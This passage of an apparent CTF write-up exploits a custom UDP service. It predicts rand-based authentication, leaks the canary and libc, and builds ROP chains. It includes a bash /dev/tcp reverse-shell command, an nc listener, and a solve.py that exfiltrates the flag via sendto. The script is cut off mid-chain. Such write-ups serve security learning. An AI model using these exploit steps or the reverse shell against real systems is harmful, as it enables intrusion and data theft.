</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    glibc<span style="color:#f92672">.</span>srand(glibc<span style="color:#f92672">.</span>time(<span style="color:#66d9ef">None</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        plain<span style="color:#f92672">+=</span>p8(glibc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)    
</span></span><span style="display:flex;"><span>    print(plain<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">authenticate</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> session
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>plain
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    print(data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>genarate_rand_string()  
</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span>authenticate()
</span></span><span style="display:flex;"><span>print(a)
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>printdata(<span style="color:#ae81ff">0xfff</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0xfff</span>)
</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recv())
</span></span><span style="display:flex;"><span>data<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">0x1000</span>)
</span></span><span style="display:flex;"><span>heap<span style="color:#f92672">=</span>u64(data[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">10</span>]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x4ba0</span>
</span></span><span style="display:flex;"><span>print(hex(heap))
</span></span></code></pre></div><p>This code attempts to execute a heap leak using <code>opcode 0x301</code>, but unfortunately it fails in the server</p>
<p>We have to leak canary and libc via <code>opcode 0x101</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x30a</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>b<span style="color:#960050;background-color:#1e0010">&#39;</span>moonlit_embrace<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>len(b<span style="color:#960050;background-color:#1e0010">&#39;</span>moonlit_embrace<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>))<span style="color:#f92672">*</span>b<span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io.send(buf)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io.recv()
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>u64(b<span style="color:#e6db74">&#39;\0&#39;</span><span style="color:#f92672">+</span>data[<span style="color:#ae81ff">265</span><span style="color:#f92672">:</span>])
</span></span><span style="display:flex;"><span>log.info(<span style="color:#e6db74">&#34;canary: &#34;</span> <span style="color:#f92672">+</span> hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x30a</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>b<span style="color:#960050;background-color:#1e0010">&#39;</span>moonlit_embrace<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(b<span style="color:#960050;background-color:#1e0010">&#39;</span>moonlit_embrace<span style="color:#960050;background-color:#1e0010">&#39;</span>))<span style="color:#f92672">*</span>b<span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>data[<span style="color:#ae81ff">265</span><span style="color:#f92672">:</span>]
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>b<span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io.send(buf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io.recv()
</span></span><span style="display:flex;"><span>libc.address<span style="color:#f92672">=</span>u64(data[<span style="color:#ae81ff">264</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span>].ljust(<span style="color:#ae81ff">8</span>, b<span style="color:#e6db74">&#39;\0&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x94ac3</span>
</span></span><span style="display:flex;"><span>log.info(<span style="color:#e6db74">&#34;libc.address: &#34;</span> <span style="color:#f92672">+</span> hex(libc.address))
</span></span></code></pre></div><p>Here is result:</p>
<pre tabindex="0"><code>    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                       1   w1n_gl0ry@phis1Ng 
 python3 remote.py                                                                                                                                               
[*] &#39;/home/w1n_gl0ry/CTF/Pwnable/2023/wc2023/serendipity/libc.so.6&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 0 on port 9981: Done
85026bdce60e5a253187b0a061854c0269225675b70fcadd25c7353058ffb4dd
b&#39;auth successfully\n&#39;
[*] canary: 0x89f7373a66e1cd00
[*] libc.address: 0x7f4413600000
[*] Switching to interactive mode
$  
</code></pre><p>We have successfully leaked. How can we get the shell through the UDP connection?</p>
<p>I use this method to execute a reverse shell:</p>
<ul>
<li>Listen on a port 1337:</li>
</ul>
<pre tabindex="0"><code>    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                                             w1n_gl0ry@phis1Ng 
 nc -lnvp 1337                                                                                                                                                                     
Listening on 0.0.0.0 1337
</code></pre><ul>
<li>I use the system function in my ROP to execute a command.</li>
</ul>
<pre tabindex="0"><code>system(&#39;bash -c \&#39;exec bash -i &amp;&gt;/dev/tcp/0/1337 &lt;&amp;1\&#39;&#39;)
</code></pre><p>Result:</p>
<pre tabindex="0"><code>    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                                             w1n_gl0ry@phis1Ng 
 nc -lnvp 1337                                                                                                                                                                     
Listening on 0.0.0.0 1337
Connection received on 127.0.0.1 34014
w1n_gl0ry@phis1Ng:~/CTF/Pwnable/2023/wc2023/serendipity$ 
w1n_gl0ry@phis1Ng:~/CTF/Pwnable/2023/wc2023/serendipity$ id
id
uid=1000(w1n_gl0ry) gid=1000(w1n_gl0ry) groups=1000(w1n_gl0ry),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),118(lpadmin)
</code></pre><p>We successfully achieved RCE using reverse shell. However, the docker blocked external network access, preventing us from obtaining a shell.</p>
<h2 id="final-phase">final phase</h2>
<p>During the contest, I considered an alternative approach: simply performing an open-read-write to obtain the flag. The author also hinted at the flag&rsquo;s location: /home/user/flag. But can we obtain the flag by writing to stdout?</p>
<p>No, we need to come up with a different approach to send the flag over the UDP connection. So, I will use an open-read-sendto chain to get the flag</p>
<p>So what parameters does the <code>sendto</code> syscall need?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">sendto</span>(<span style="color:#66d9ef">int</span> sockfd, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>buf, <span style="color:#66d9ef">size_t</span> len, <span style="color:#66d9ef">int</span> flags, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>dest_addr, <span style="color:#66d9ef">socklen_t</span> addrlen);
</span></span></code></pre></div><p>Fortunately, the r8 register points to our sockaddr struct before executing our ROP chain.</p>
<pre tabindex="0"><code> RAX  0x0
 RBX  0x7f744c1fe640  0x7f744c1fe640
 RCX  0x7f744cb27c56 (sendto+118)  cmp rax, -0x1000 /* &#39;H=&#39; */
*RDX  0x0
 RDI  0x0
 RSI  0x560df594a3d4  &#34;file can&#39;t be read\n&#34;
 R8   0x560df594a3c0  0x100007fa8d10002  // our sockaddr struct
 R9   0x10
 R10  0x0
 R11  0x293
 R12  0x7f744c1fe640  0x7f744c1fe640
 R13  0x0
 R14  0x7f744ca947d0 (start_thread)  endbr64 
 R15  0x7ffed7952e20  0x0
 RBP  0x7f744c1fde50  0x4141414141414141 (&#39;AAAAAAAA&#39;)
 RSP  0x7f744c1fdaf0  0x0
*RIP  0x560df4890e70  je 0x560df4890e77
*EFLAGS 0x246 [ cf PF af ZF sf IF df of ]
[ DISASM / x86-64 / set emulate on ]
   0x560df4890d19                             call   0x560df48909b9                &lt;0x560df48909b9&gt;
 
   0x560df4890d1e                             mov    eax, 0
   0x560df4890d23                             jmp    0x560df4890e63                &lt;0x560df4890e63&gt;
    
   0x560df4890e63                             mov    rdx, qword ptr [rbp - 8]
   0x560df4890e67                             sub    rdx, qword ptr fs:[0x28]
  0x560df4890e70                            je     0x560df4890e77                &lt;0x560df4890e77&gt;
    
   0x560df4890e77                             leave  
   0x560df4890e78                             ret    
    
   0x7f744ca2a3e5 &lt;iconv+197&gt;                 pop    rdi
   0x7f744ca2a3e6 &lt;iconv+198&gt;                 ret    
    
   0x7f744ca796a2 &lt;printf_positional+5666&gt;    pop    rdx
[ STACK ]
00:0000 rsp 0x7f744c1fdaf0  0x0
01:0008     0x7f744c1fdaf8  0x560df598b360  0x560df594a3c0  0x100007fa8d10002
02:0010     0x7f744c1fdb00  0x0
03:0018     0x7f744c1fdb08  0x0
04:0020     0x7f744c1fdb10  0x560df594a3c0  0x100007fa8d10002
05:0028     0x7f744c1fdb18  0x7f7444000b70  0xc7ccaec0fbfe94bc
06:0030     0x7f744c1fdb20  0x0
07:0038     0x7f744c1fdb28  0x0
[ BACKTRACE ]
  0   0x560df4890e70
   1   0x7f744ca2a3e5 iconv+197
   2   0x7f744ca796a2 printf_positional+5666
   3   0x7f744ca796a2 printf_positional+5666
   4   0x7f744ca796a2 printf_positional+5666
[ THREADS (3 TOTAL) ]
   3   &#34;serendipity_pat&#34; stopped: 0x560df4890e70
    1   &#34;serendipity_pat&#34; stopped: 0x7f744cb1b82d &lt;select+349&gt; 
    2   &#34;serendipity_pat&#34; stopped: 0x7f744cae57f8 &lt;clock_nanosleep@GLIBC_2.2.5+200&gt; 

pwndbg&gt; 
</code></pre><p>We finally assigned the respective arguments.</p>
<pre tabindex="0"><code>  0x7f744cb4101b &lt;__netlink_close+11&gt;        syscall  &lt;SYS_sendto&gt;
        fd: 0xb (socket:[153083])
        buf: 0x7f744cc1a8c8 (buffer)  &#39;server_flag\n&#39;
        n: 0xc
        flags: 0x0
        addr: 0x560df594a3c0  0x100007fa8d10002
        addr_len: 0x10
   0x7f744cb4101d &lt;__netlink_close+13&gt;        ret  
</code></pre><p>Result:</p>
<pre tabindex="0"><code>    ~/CTF/Pwnable/2023/wc2023/serendipity    master !1 ?38                                                                       1   w1n_gl0ry@phis1Ng 
 python3 remote.py                                                                                                                                               
[*] &#39;/home/w1n_gl0ry/CTF/Pwnable/2023/wc2023/serendipity/libc.so.6&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 0 on port 9981: Done
bc94fefbc0aeccc762678d353d911917c32ce5266a0df70afd4bef072fb147ec
b&#39;auth successfully\n&#39;
[*] canary: 0x63648f5a8f209500
[*] libc.address: 0x7f744ca00000
[*] Paused (press any to continue)
b&#34;In the moon&#39;s tender embrace, shadows waltz in a silvery dance, weaving dreams with a gentle trance.\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#34;
[*] Switching to interactive mode
file can&#39;t be read
server_flag
$ 
</code></pre><h2 id="exploit-script-1">Exploit script</h2>
<blockquote>
<p>solve.py</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ctypes <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket 
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep 
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>glibc <span style="color:#f92672">=</span> cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#39;libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io=remote(&#39;157.245.147.89&#39;, 24210, typ=&#34;udp&#34;)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">9981</span>, typ<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;udp&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>opcode<span style="color:#f92672">=</span>[<span style="color:#ae81ff">0x301</span>, <span style="color:#ae81ff">0x101</span>, <span style="color:#ae81ff">0x201</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printdata</span>(size, data):
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(size)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>data
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>plain<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">genarate_rand_string</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>, data<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> plain
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">1</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(size)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    glibc<span style="color:#f92672">.</span>srand(glibc<span style="color:#f92672">.</span>time(<span style="color:#66d9ef">None</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">32</span>):
</span></span><span style="display:flex;"><span>        plain<span style="color:#f92672">+=</span>p8(glibc<span style="color:#f92672">.</span>rand() <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>)    
</span></span><span style="display:flex;"><span>    print(plain<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> data
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">authenticate</span>(size<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> session
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">=</span>p32(<span style="color:#ae81ff">0x70303070</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p32(opcode[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>    pl<span style="color:#f92672">+=</span>plain
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>send(pl)
</span></span><span style="display:flex;"><span>    data<span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">=</span>io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>    print(data)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> session
</span></span><span style="display:flex;"><span>     
</span></span><span style="display:flex;"><span>genarate_rand_string()  
</span></span><span style="display:flex;"><span>a<span style="color:#f92672">=</span>authenticate()
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(a)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pause()</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># printdata(0xfff, b&#39;A&#39;*0xfff)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(io.recv())</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># data=io.recv(0x1000)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># heap=u64(data[4:10].ljust(8, b&#39;\0&#39;)) - 0x4ba0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(hex(heap))</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x30a</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>leak<span style="color:#f92672">=</span>u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>data[<span style="color:#ae81ff">265</span>:])
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;canary: &#34;</span> <span style="color:#f92672">+</span> hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session<span style="color:#f92672">=</span>a
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span>session
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p32(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>p16(<span style="color:#ae81ff">0x30a</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">7</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>(<span style="color:#ae81ff">778</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">-</span>len(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;moonlit_embrace&#39;</span>))<span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span>data[<span style="color:#ae81ff">265</span>:]
</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(buf)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">=</span>u64(data[<span style="color:#ae81ff">264</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>:]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x94ac3</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc.address: &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rax<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000045eb0</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>bin_sh<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span>next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>pop_rdi<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002a3e5</span>
</span></span><span style="display:flex;"><span>pop_rsi<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002be51</span>
</span></span><span style="display:flex;"><span>pop_rdx<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x00000000000796a2</span>
</span></span><span style="display:flex;"><span>mov_rdi_rdx<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000149709</span>
</span></span><span style="display:flex;"><span>mov_r8_rbx<span style="color:#f92672">=</span><span style="color:#ae81ff">0x0000000000121f8a</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>pop_rcx_rbx<span style="color:#f92672">=</span>libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x0000000000108b04</span>
</span></span><span style="display:flex;"><span>ret<span style="color:#f92672">=</span>pop_rdi<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>xchg_edi_eax<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000009198d</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>mov_rax_r8<span style="color:#f92672">=</span><span style="color:#ae81ff">0x000000000011db23</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>syscall<span style="color:#f92672">=</span><span style="color:#ae81ff">0x14101b</span><span style="color:#f92672">+</span>libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi) 
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>))
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">8319607999311079471</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(mov_rdi_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdi)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(libc<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">40</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(pop_rdx)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(<span style="color:#ae81ff">29099040799945317</span>)
</span></span><span style="display:flex;"><span>pl<span style="color:#f92672">+=</span>p64(mov_rdi_rdx)
